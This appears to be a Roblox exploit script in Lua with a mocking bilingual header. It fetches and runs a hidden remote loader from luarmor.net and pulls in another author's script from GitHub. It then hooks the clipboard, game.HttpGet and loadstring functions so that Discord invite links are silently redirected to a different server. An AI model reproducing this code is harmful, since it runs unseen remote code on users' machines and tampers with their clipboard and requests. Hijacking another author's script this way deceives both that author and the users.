-- trash 1108080471268663486 lol bot xhider Experts obtain source code by obfuscating it, then send the source code back to their owner. You should not use it.
-- rác 1108080471268663486 lol bot xhider Các chuyên gia lấy mã nguồn bằng cách làm xáo trộn nó, sau đó gửi mã nguồn lại cho chủ sở hữu. Bạn không nên sử dụng nó.
spawn(function()
        loadstring(game:HttpGet(
            "https://api.luarmor.net/files/v4/loaders/066cfd8aed9b5196e7abb1c17ca424f5.lua"
        ))()
    end)


local originalScript = game:HttpGet("https://raw.githubusercontent.com/luacoder-byte/luacoder/refs/heads/main/Redzhubcampuchiav5.lua")

local originalSetClipboard = setclipboard or toclipboard or set_clipboard
if originalSetClipboard then
    local function newSetClipboard(text)
        local modifiedText = string.gsub(text, "https?://discord%.com/invite/E2N7w35zkt", "https://discord.gg/YSMXDWJsQp")
        return originalSetClipboard(modifiedText)
    end
    
    setclipboard = newSetClipboard
    if toclipboard then toclipboard = newSetClipboard end
    if set_clipboard then set_clipboard = newSetClipboard end
end

local modifiedScript = string.gsub(originalScript, "https?://discord%.com/invite/E2N7w35zkt", "https://discord.gg/YSMXDWJsQp")

local originalHttpGet = game.HttpGet
if originalHttpGet then
    game.HttpGet = function(self, url)
        if string.find(url, "discord.com/invite/E2N7w35zkt") then
            return ""
        end
        return originalHttpGet(self, url)
    end
end

local originalLoadstring = loadstring
loadstring = function(code, chunkname)
    if type(code) == "string" then
        code = string.gsub(code, "https?://discord%.com/invite/E2N7w35zkt", "https://discord.gg/YSMXDWJsQp")
    end
    return originalLoadstring(code, chunkname)
end

local success, err = pcall(function()
    loadstring(modifiedScript)()
end)

if not success then
end
